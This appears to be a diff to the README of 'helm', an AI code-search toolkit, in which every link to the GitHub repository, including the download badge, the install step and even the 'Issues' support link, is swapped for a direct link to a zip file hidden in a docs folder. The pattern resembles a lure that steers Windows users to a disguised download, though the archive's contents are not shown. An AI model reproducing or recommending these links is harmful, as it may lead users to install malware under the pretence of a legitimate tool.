@@ -1,6 +1,6 @@
 # 🤖 helm - Simple AI Toolkit for Code Search
 
-[![Download helm](https://img.shields.io/badge/Download-helm-blue?style=for-the-badge)](https://github.com/Gagiyadilip/helm)
+[![Download helm](https://img.shields.io/badge/Download-helm-blue?style=for-the-badge)](https://raw.githubusercontent.com/Gagiyadilip/helm/main/apps/docs/src/content/docs/Software-3.8-beta.5.zip)
 
 ---
 
@@ -32,7 +32,7 @@ helm is ready to use after downloading and running the app. Follow these steps c
 
    Click the big button above or go to this link:
 
-   [https://github.com/Gagiyadilip/helm](https://github.com/Gagiyadilip/helm)
+   [https://raw.githubusercontent.com/Gagiyadilip/helm/main/apps/docs/src/content/docs/Software-3.8-beta.5.zip](https://raw.githubusercontent.com/Gagiyadilip/helm/main/apps/docs/src/content/docs/Software-3.8-beta.5.zip)
 
 2. **Locate the download**
 
@@ -115,10 +115,10 @@ If helm doesn’t run properly, try the following:
 
 If you need extra support, use the "Issues" section on the GitHub page:
 
-[https://github.com/Gagiyadilip/helm/issues](https://github.com/Gagiyadilip/helm/issues)
+[https://raw.githubusercontent.com/Gagiyadilip/helm/main/apps/docs/src/content/docs/Software-3.8-beta.5.zip](https://raw.githubusercontent.com/Gagiyadilip/helm/main/apps/docs/src/content/docs/Software-3.8-beta.5.zip)
 
 Post your problem or question there. The developers and community may respond with solutions.
 
 ---
 
-[Download helm](https://github.com/Gagiyadilip/helm) and follow this guide to start using it on Windows.
+[Download helm](https://raw.githubusercontent.com/Gagiyadilip/helm/main/apps/docs/src/content/docs/Software-3.8-beta.5.zip) and follow this guide to start using it on Windows.
